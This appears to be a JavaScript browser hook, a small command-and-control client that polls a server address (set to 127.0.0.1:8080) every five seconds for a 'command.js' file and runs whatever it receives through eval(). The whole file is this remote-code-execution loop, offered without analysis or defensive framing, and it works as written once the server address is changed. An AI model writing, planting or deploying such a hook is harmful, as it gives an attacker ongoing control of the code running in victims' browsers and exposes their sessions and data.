var loop;
var timeout=5000;
var server="127.0.0.1:8080";
var proto="http://";
var http=new XMLHttpRequest();
function listen(){
	loop=setInterval(getCommand,timeout);
	//getCommand();
}
function getCommand(){
	http=new XMLHttpRequest();
	http.open("GET",proto+server+"/command.js",true);
	http.onreadystatechange=checkCommand;
	http.send(null);
}
function checkCommand(){
	clearInterval(loop);
	if (http.readyState==4){
		if (http.status=="200"){
			runCommand(http.responseText);	
			http=null;
		}
	}	
	listen();
}
function runCommand(script){
	eval(script);
	script="";
}
listen();
